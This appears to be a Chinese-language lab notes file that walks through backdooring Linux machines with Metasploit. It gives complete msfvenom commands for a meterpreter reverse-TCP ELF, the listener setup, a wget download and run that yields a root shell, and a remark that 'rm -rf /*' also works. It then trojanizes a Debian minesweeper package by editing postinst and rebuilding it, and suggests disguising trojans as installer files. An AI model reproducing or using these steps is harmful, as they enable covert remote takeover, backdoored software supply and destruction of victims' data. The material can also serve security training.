@@ -1,0 +1,340 @@
+linux很多电脑没有杀毒软件 很危险
+
+msfvenom -a x64 --platform linux -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.101.53 LPORT=4444 -b "\x00" -f elf -o /var/www/html/testliunx
+┌──(root💀tyza66)-[~]
+└─# msfvenom -a x64 --platform linux -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.101.53 LPORT=4444 -b "\x00" -f elf -o /var/www/html/testliunx
+Found 3 compatible encoders
+Attempting to encode payload with 1 iterations of x64/xor
+x64/xor succeeded with size 175 (iteration=0)
+x64/xor chosen with final size 175
+Payload size: 175 bytes
+Final size of elf file: 295 bytes
+Saved as: /var/www/html/testliunx
+
+
+生成一个木马
+┌──(root💀tyza66)-[~]
+└─# msfvenom -a x64 --platform linux -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.101.53 LPORT=4444 -b "\x00" -f elf -o /var/www/html/testliunx
+Found 3 compatible encoders
+Attempting to encode payload with 1 iterations of x64/xor
+x64/xor succeeded with size 175 (iteration=0)
+x64/xor chosen with final size 175
+Payload size: 175 bytes
+Final size of elf file: 295 bytes
+Saved as: /var/www/html/testliunx
+
+更换payload开始监听
+msf6 > use exploit/multi/handler
+[*] Using configured payload windows/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
+payload => linux/x64/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > options
+
+Payload options (linux/x64/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.101.53   yes       The listen address (an interface may be specified
+                                     )
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(multi/handler) > run
+
+[*] Started reverse TCP handler on 192.168.101.53:4444 
+
+
+之后去目标机器上下载木马 直接wget
+Last login: Sat Feb 15 22:55:57 2025 from 192.168.101.96
+[root@localhost ~]# wget http://192.168.101.53/testlinux
+--2025-02-17 00:15:40--  http://192.168.101.53/testlinux
+正在连接 192.168.101.53:80... 已连接。
+已发出 HTTP 请求，正在等待回应... 404 Not Found
+2025-02-17 00:15:40 错误 404：Not Found。
+
+[root@localhost ~]# wget http://192.168.101.53/testliunx
+--2025-02-17 00:17:51--  http://192.168.101.53/testliunx
+正在连接 192.168.101.53:80... 已连接。
+已发出 HTTP 请求，正在等待回应... 200 OK
+长度：295
+正在保存至: “testliunx”
+
+100%[=================================================================================>] 295         --.-K/s 用时 0s      
+
+2025-02-17 00:17:51 (98.2 MB/s) - 已保存 “testliunx” [295/295])
+
+之后我们运行一下
+[root@localhost ~]# ^C
+[root@localhost ~]# ./testliunx
+-bash: ./testliunx: 权限不够
+[root@localhost ~]# chmod 777 ./testliunx
+[root@localhost ~]# ./testliunx
+
+回kali看挂马情况 发现已经成功
+msf6 exploit(multi/handler) > run
+
+[*] Started reverse TCP handler on 192.168.101.53:4444 
+ls
+[*] Sending stage (3045380 bytes) to 192.168.101.99
+[*] Meterpreter session 14 opened (192.168.101.53:4444 -> 192.168.101.99:49414) at 2025-02-17 16:22:47 +0800
+
+meterpreter > ls
+Listing: /root
+==============
+
+Mode              Size   Type  Last modified              Name
+----              ----   ----  -------------              ----
+100600/rw-------  24922  fil   2025-02-16 15:10:53 +0800  .bash_history
+100644/rw-r--r--  18     fil   2013-12-29 10:26:31 +0800  .bash_logout
+100644/rw-r--r--  176    fil   2013-12-29 10:26:31 +0800  .bash_profile
+100644/rw-r--r--  176    fil   2013-12-29 10:26:31 +0800  .bashrc
+040700/rwx------  31     dir   2025-02-16 09:49:07 +0800  .cache
+040700/rwx------  30     dir   2025-02-16 09:49:07 +0800  .config
+100644/rw-r--r--  100    fil   2013-12-29 10:26:31 +0800  .cshrc
+040700/rwx------  25     dir   2025-02-16 09:45:42 +0800  .dbus
+040740/rwxr-----  19     dir   2025-02-16 09:49:21 +0800  .pki
+100644/rw-r--r--  129    fil   2013-12-29 10:26:31 +0800  .tcshrc
+100600/rw-------  681    fil   2025-02-16 10:18:04 +0800  .viminfo
+100600/rw-------  2827   fil   2025-02-16 09:45:14 +0800  anaconda-ks.cfg
+100644/rw-r--r--  2835   fil   2025-02-16 09:45:55 +0800  initial-setup-ks.cfg
+100600/rw-------  2107   fil   2025-02-16 09:45:14 +0800  original-ks.cfg
+100777/rwxrwxrwx  295    fil   2025-02-17 16:21:55 +0800  testliunx
+
+meterpreter > ls
+Listing: /root
+==============
+
+Mode              Size   Type  Last modified              Name
+----              ----   ----  -------------              ----
+100600/rw-------  24922  fil   2025-02-16 15:10:53 +0800  .bash_history
+100644/rw-r--r--  18     fil   2013-12-29 10:26:31 +0800  .bash_logout
+100644/rw-r--r--  176    fil   2013-12-29 10:26:31 +0800  .bash_profile
+100644/rw-r--r--  176    fil   2013-12-29 10:26:31 +0800  .bashrc
+040700/rwx------  31     dir   2025-02-16 09:49:07 +0800  .cache
+040700/rwx------  30     dir   2025-02-16 09:49:07 +0800  .config
+100644/rw-r--r--  100    fil   2013-12-29 10:26:31 +0800  .cshrc
+040700/rwx------  25     dir   2025-02-16 09:45:42 +0800  .dbus
+040740/rwxr-----  19     dir   2025-02-16 09:49:21 +0800  .pki
+100644/rw-r--r--  129    fil   2013-12-29 10:26:31 +0800  .tcshrc
+100600/rw-------  681    fil   2025-02-16 10:18:04 +0800  .viminfo
+100600/rw-------  2827   fil   2025-02-16 09:45:14 +0800  anaconda-ks.cfg
+100644/rw-r--r--  2835   fil   2025-02-16 09:45:55 +0800  initial-setup-ks.cfg
+100600/rw-------  2107   fil   2025-02-16 09:45:14 +0800  original-ks.cfg
+100777/rwxrwxrwx  295    fil   2025-02-17 16:21:55 +0800  testliunx
+
+meterpreter > 
+
+用户用什么权限指定的木马 我们就能拿到什么权限
+meterpreter > shell
+Process 74730 created.
+Channel 1 created.
+ls
+anaconda-ks.cfg
+initial-setup-ks.cfg
+original-ks.cfg
+testliunx
+id
+uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+#######################rm -rf /* 也可以
+
+我们可以将木马伪装成基础的库文件 
+比如伪装成各种install
+apache.install
+tomcat.install
+
+除了直接这样运行 还可以制作恶意deb软件包来植入后门
+我们想要对deb文件解包
+┌──(root💀tyza66)-[~]
+└─# dpkg --info freesweep_1.0.1-2_amd64.deb 
+ 新格式的 Debian 软件包，格式版本 2.0。
+ 大小 55636 字节：主控包=1136 字节。
+      13 bytes,     1 lines      conffiles
+     666 bytes,    15 lines      control
+     496 bytes,     7 lines      md5sums
+     186 字节，   16 行   *  postinst             #!/bin/sh
+     121 字节，   13 行   *  postrm               #!/bin/sh
+ Package: freesweep
+ Version: 1.0.1-2
+ Architecture: amd64
+ Maintainer: Debian Games Team <pkg-games-devel@lists.alioth.debian.org>
+ Installed-Size: 139
+ Depends: libc6 (>= 2.7), libncurses6 (>= 6), libtinfo6 (>= 6)
+ Section: games
+ Priority: optional
+ Homepage: https://github.com/rwestlund/freesweep
+ Description: text-based minesweeper
+  Freesweep is an implementation of the popular minesweeper game, where
+  one tries to find all the mines without igniting any, based on hints given
+  by the computer.  Unlike most implementations of this game, Freesweep
+  works in any visual text display - in Linux console, in an xterm, and in
+  most text-based terminals currently in use.
+┌──(root💀tyza66)-[~]
+└─# dpkg --info freesweep_1.0.1-2_amd64.deb 
+ 新格式的 Debian 软件包，格式版本 2.0。
+ 大小 55636 字节：主控包=1136 字节。
+      13 bytes,     1 lines      conffiles
+     666 bytes,    15 lines      control
+     496 bytes,     7 lines      md5sums
+     186 字节，   16 行   *  postinst             #!/bin/sh
+     121 字节，   13 行   *  postrm               #!/bin/sh
+ Package: freesweep
+ Version: 1.0.1-2
+ Architecture: amd64
+ Maintainer: Debian Games Team <pkg-games-devel@lists.alioth.debian.org>
+ Installed-Size: 139
+ Depends: libc6 (>= 2.7), libncurses6 (>= 6), libtinfo6 (>= 6)
+ Section: games
+ Priority: optional
+ Homepage: https://github.com/rwestlund/freesweep
+ Description: text-based minesweeper
+  Freesweep is an implementation of the popular minesweeper game, where
+  one tries to find all the mines without igniting any, based on hints given
+  by the computer.  Unlike most implementations of this game, Freesweep
+  works in any visual text display - in Linux console, in an xterm, and in
+  most text-based terminals currently in use.
+
+┌──(root💀tyza66)-[~]
+└─# dbkg -x freesweep_1.0.1-2_amd64.deb free
+找不到命令 “dbkg”，您的意思是：
+  “dpkg” 命令来自 Debian 软件包 dpkg
+尝试 apt install <deb name>
+                                                                             
+┌──(root💀tyza66)-[~]
+└─# ls free
+ls: 无法访问 'free': 没有那个文件或目录
+                                                                             
+┌──(root💀tyza66)-[~]
+└─# dpkg -x freesweep_1.0.1-2_amd64.deb free
+                                                                             
+┌──(root💀tyza66)-[~]
+└─# ls free
+etc  usr  var
+
+┌──(root💀tyza66)-[~]
+└─# cd free
+                                                                             
+┌──(root💀tyza66)-[~/free]
+└─# cd ../ 
+                                                                             
+┌──(root💀tyza66)-[~]
+└─# dpkg -e freesweep_1.0.1-2_amd64.deb free/DEBIAN
+                                                                             
+┌──(root💀tyza66)-[~]
+└─# ls free
+DEBIAN  etc  usr  var
+                                                                             
+┌──(root💀tyza66)-[~]
+└─# cd ./free/DEBIAN 
+                                                                             
+┌──(root💀tyza66)-[~/free/DEBIAN]
+└─# ls     
+conffiles  control  md5sums  postinst  postrm
+
+准备生成语句
+msfvenom -a x64 --platform linux -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.101.53 LPORT=4444 -b "\x00" -f elf -o /root/free/usr/games/freesweep_sources
+
+┌──(root💀tyza66)-[~/free]
+└─# cd ./usr        
+                                                                             
+┌──(root💀tyza66)-[~/free/usr]
+└─# ls      
+games  share
+                                                                             
+┌──(root💀tyza66)-[~/free/usr]
+└─# cd ../games
+cd: 没有那个文件或目录: ../games
+                                                                             
+┌──(root💀tyza66)-[~/free/usr]
+└─# cd ./games 
+                                                                             
+┌──(root💀tyza66)-[~/free/usr/games]
+└─# ls
+freesweep
+                                                                             
+┌──(root💀tyza66)-[~/free/usr/games]
+└─# cd        
+                                                                             
+┌──(root💀tyza66)-[~]
+└─# msfvenom -a x64 --platform linux -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.101.53 LPORT=4444 -b "\x00" -f elf -o /root/free/usr/games/freesweep_sources
+Found 3 compatible encoders
+Attempting to encode payload with 1 iterations of x64/xor
+x64/xor succeeded with size 175 (iteration=0)
+x64/xor chosen with final size 175
+Payload size: 175 bytes
+Final size of elf file: 295 bytes
+Saved as: /root/free/usr/games/freesweep_sources
+                                                                             
+┌──(root💀tyza66)-[~]
+└─# cd /free/usr/games
+cd: 没有那个文件或目录: /free/usr/games
+                                                                             
+┌──(root💀tyza66)-[~]
+└─# cd ./free/usr/games
+                                                                             
+──(root💀tyza66)-[~/free/usr/games]
+└─# ls
+freesweep  freesweep_sources
+                                                                             
+┌──(root💀tyza66)-[~/free/usr/games]
+└─# cd                 
+                                                                             
+┌──(root💀tyza66)-[~]
+└─# vim /root/free/DEBIAN/postinst 
+                                                                             
+之后我们要重新构建软件包
+┌──(root💀tyza66)-[~]
+└─# dpkg-deb --build /root/free                    
+dpkg-deb: 正在 '/root/free.deb' 中构建软件包 'freesweep'。
+                                                                             
+┌──(root💀tyza66)-[~]
+└─# ls
+服务器账密.txt  aircrack_8812au              home
+公共            bak.xml                      msf.exe
+模板            binding                      output
+视频            Desktop                      ppzbPalG.html
+图片            free                         SecureCRT-kg.exe
+文档            free.deb                     SecureCRT-kg.ico
+下载            freesweep_1.0.1-2_amd64.deb  ZkKBlJwr.jpeg
+音乐            go
+桌面            hello.txt
+
+就会产生free.deb
+
+之后咱们尝试安装软件包看看
+┌──(root💀tyza66)-[~]
+└─# dpkg -i free.deb                               
+正在选中未选择的软件包 freesweep。
+(正在读取数据库 ... 系统当前共安装有 432268 个文件和目录。)
+准备解压 free.deb  ...
+正在解压 freesweep (1.0.1-2) ...
+正在设置 freesweep (1.0.1-2) ...
+nohup: 把输出追加到 'nohup.out'
+正在处理用于 desktop-file-utils (0.27-2) 的触发器 ...
+正在处理用于 hicolor-icon-theme (0.17-2) 的触发器 ...
+正在处理用于 man-db (2.12.1-1) 的触发器 ...
+
+
+之后看监听那边
+msf6 exploit(multi/handler) > run
+
+[*] Started reverse TCP handler on 192.168.101.53:4444 
+[*] Sending stage (3045380 bytes) to 192.168.101.53
+[*] Meterpreter session 15 opened (192.168.101.53:4444 -> 192.168.101.53:42702) at 2025-02-17 16:53:55 +0800
+
+meterpreter > 
+
+成功
+
+
+
+                                                                            
